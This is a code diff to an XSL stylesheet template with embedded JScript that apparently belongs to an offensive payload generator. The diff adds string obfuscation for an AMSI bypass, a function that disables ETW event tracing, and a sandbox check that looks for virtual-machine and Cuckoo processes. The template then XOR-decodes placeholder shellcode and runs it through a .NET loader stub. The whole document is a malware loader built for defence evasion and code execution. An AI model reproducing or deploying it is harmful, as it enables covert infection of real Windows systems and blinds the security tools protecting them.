@@ -5,25 +5,56 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
+function {{ v.fn_build_str }}(a){var s="";for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]);return s;}
+
 function {{ v.fn_amsi }}() {
     try {
-        var asm = new ActiveXObject("System.Reflection.Assembly");
-        var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
-        if (amsi !== null) amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
-    } catch (e) {}
+        var asm  = new ActiveXObject("System.Reflection.Assembly");
+        var amsi = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
+        if (amsi !== null)
+            amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), 36).SetValue(null, true);
+    } catch(e) {}
 }
-{{ v.fn_amsi }}();
 
-var hex = "{{ shellcode_hex }}";
-var key = "{{ key_hex }}";
+function {{ v.fn_etw }}() {
+    try {
+        var asm = new ActiveXObject("System.Reflection.Assembly");
+        var t   = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
+        if (t !== null) {
+            var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), 36);
+            if (fi !== null) fi.SetValue(null, 0);
+        }
+    } catch(e) {}
+}
 
-function hex2arr(h) { var a=[]; for (var i=0; i<h.length; i+=2) a.push(parseInt(h.substr(i,2),16)); return a; }
-function xor(d,k) { var o=[]; for (var i=0;i<d.length;i++) o.push(d[i] ^ k[i % k.length]); return o; }
+function {{ v.fn_sandbox }}() {
+    try {
+        var wmi = GetObject("winmgmts:");
+        var bad = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe"];
+        var pq  = wmi.ExecQuery("SELECT Name FROM Win32_Process");
+        for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
+            var n = e.item().Name.toLowerCase();
+            for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
+        }
+        var mq = wmi.ExecQuery("SELECT ScreenWidth FROM Win32_DesktopMonitor");
+        for (var e2 = new Enumerator(mq); !e2.atEnd(); e2.moveNext()) {
+            if (e2.item().ScreenWidth && e2.item().ScreenWidth < 800) return true;
+        }
+    } catch(e) {}
+    return false;
+}
 
-var sc = xor(hex2arr(hex), hex2arr(key));
-var loader = new ActiveXObject("System.Reflection.Assembly");
-var asm = loader.Load(hex2arr("{{ v.dotnet_stub_hex }}"));
-asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
+function hex2arr(h){var a=[];for(var i=0;i<h.length;i+=2)a.push(parseInt(h.substr(i,2),16));return a;}
+function xor(d,k){var o=[];for(var i=0;i<d.length;i++)o.push(d[i]^k[i%k.length]);return o;}
+
+if (!{{ v.fn_sandbox }}()) {
+    {{ v.fn_amsi }}();
+    {{ v.fn_etw }}();
+    var sc = xor(hex2arr("{{ shellcode_hex }}"), hex2arr("{{ key_hex }}"));
+    var loader = new ActiveXObject("System.Reflection.Assembly");
+    var asm = loader.Load(hex2arr("{{ v.dotnet_stub_hex }}"));
+    asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
+}
 ]]>
 </ms:script>
 </stylesheet>
